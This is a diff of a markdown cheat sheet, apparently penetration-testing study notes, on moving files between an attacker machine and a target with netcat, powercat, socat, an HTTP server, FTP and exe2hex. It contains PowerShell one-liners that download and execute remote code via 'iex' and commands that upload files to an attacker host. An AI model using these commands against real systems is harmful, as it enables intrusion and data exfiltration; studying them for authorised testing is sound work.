@@ -1,12 +1,10 @@
----
-description: source -> destination
----
-
 # Transfering files
 
-### Netcat
+[back](readme.md)
 
-```text
+## Netcat
+
+```
 # source
 nc -nv <ip> <port> < <file>
 
@@ -14,9 +12,9 @@ nc -nv <ip> <port> < <file>
 nc -lvnp <port> > <file>
 ```
 
-### Powercat
+## Powercat
 
-```text
+```
 # source
 powercat -c <ip> -p <port> -i C:\<src_path>
 
@@ -24,9 +22,9 @@ powercat -c <ip> -p <port> -i C:\<src_path>
 powercat -l -p <port> -of C:\<dst_path>
 ```
 
-### Socat
+## Socat
 
-```text
+```
 # source
 socat TCP4-LISTEN:<port>,fork file:<src_path>
 
@@ -34,9 +32,9 @@ socat TCP4-LISTEN:<port>,fork file:<src_path>
 socat TCP4:<ip>:<port> file:<dst_path>,create
 ```
 
-### HTTP server + Powershell
+## HTTP server + Powershell
 
-```text
+```
 # create server on attacker machine with one of these
 python3 -m http.server <port>
 python2 -m SimpleHTTPServer <port>
@@ -55,9 +53,9 @@ iex (New-Object System.Net.WebClient).DownloadString("<source>")
 iex (New-Object System.Net.WebClient).UploadFile("<destination>", "<file>")
 ```
 
-### pure-ftp
+## pure-ftp
 
-```text
+```
 # ftp server needs to be configured before
 
 echo open <attacker> 21 > ftp.txt
@@ -70,13 +68,13 @@ echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 ```
 
-### exe2hex
+## exe2hex
 
-```text
+```
 upc -9 <file>
 exe2hex -x <file> -p <output>.cmd
 # copy paste into target terminal
 ```
 
-### If all fails, base64
+## If everything fails, base64
 
